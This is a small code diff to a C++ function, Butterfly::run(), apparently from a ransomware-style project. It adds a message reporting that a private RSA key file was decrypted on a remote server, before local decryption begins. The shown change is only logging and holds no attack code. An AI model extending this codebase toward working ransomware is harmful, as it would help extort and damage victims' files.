@@ -176,6 +176,11 @@ void Butterfly::run()
 
         if ( httpClient->statusCode == 200 )
         {
+            #ifdef LOGGING
+            LOG_INFO("Successfully decrypted the CPrivateRSA.bin file on the remote server!");
+            #else
+            std::cout << "Successfully decrypted the CPrivateRSA.bin file on the remote server!" << std::endl;
+            #endif
             // Decryptor instance to invoke the directory for the decryption process
             std::unique_ptr<butterfly::hybrid::Decryptor> decryptor(new butterfly::hybrid::Decryptor());
             decryptor->setDecryptedCPrivateRSAStr(decryptedCPrivateRSAStr);
@@ -188,7 +193,6 @@ void Butterfly::run()
             std::cout << "Failure on post request to decryption server with statuscode: " << httpClient->statusCode << " and reason: " << httpClient->reasonPhrase << std::endl;
             #endif
         }
-
 
     }
     // Start Decryption with provided key
